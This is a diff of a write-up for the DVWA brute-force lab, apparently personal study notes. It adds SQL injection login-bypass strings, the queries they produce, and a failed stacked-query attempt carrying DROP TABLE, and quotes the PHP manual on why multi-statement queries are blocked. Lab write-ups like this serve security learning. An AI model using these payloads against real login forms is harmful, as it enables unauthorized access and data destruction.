@@ -4,7 +4,7 @@ title: "Brute Force"
 date: 2020-07-03T22:26:03+08:00
 ---
 
-Brute Force Challenges of DVWA.
+<https://github.com/ethicalhack3r/DVWA/blob/master/vulnerabilities/brute/index.php>
 
 ## Low
 
@@ -16,19 +16,38 @@ Brute Force Challenges of DVWA.
 
 No filter of user inputs, we can have two ways to bypass the password check.
 
-### Solution
+### SQL Injection
 
-If we know the user name, we can fill in `admin' or '1' = '1`.
+<https://www.w3schools.com/sql/sql_injection.asp>
+
+If we know the user name, we can fill in 
+
+- user: `admin' or '' = '`.
 
 ```
-    $query  = "SELECT * FROM `users` WHERE user = 'admin' or '1'='1' AND password = '$pass';";
+    $query  = "SELECT * FROM `users` WHERE user = 'admin' or ''='' AND password = '$pass';";
 ```
 
-If we do not know the user name, we can fill in `x' or 1 = 1 limit 1 #`.
+If we do not know the user name, we can fill in 
+
+- user: `x' or 1 = 1 limit 1 #`.
+- user: `x' or 1 = 1 limit 1 -- `.
 
 ```
     $query  = "SELECT * FROM `users` WHERE user = 'xxx' or 1 = 1 limit 1 #' AND password = '$pass';";
 ```
+
+We failed to do something like:
+
+- user: `xxx' or ''='';  DROP TABLE Persons; #`
+
+```
+    $query  = "SELECT * FROM `users` WHERE user = 'xxx'; DROP TABLE Persons; #' AND password = '';";
+```
+
+<https://www.php.net/manual/en/mysqli.quickstart.multiple-statement.php>
+
+> The API functions mysqli_query() and mysqli_real_query() do not set a connection flag necessary for activating multi queries in the server. An extra API call is used for multiple statements to reduce the likeliness of accidental SQL injection attacks. An attacker may try to add statements such as ; DROP DATABASE mysql or ; SELECT SLEEP(999). If the attacker succeeds in adding SQL to the statement string but mysqli_multi_query is not used, the server will not execute the second, injected and malicious SQL statement.
 
 ## Medium
 
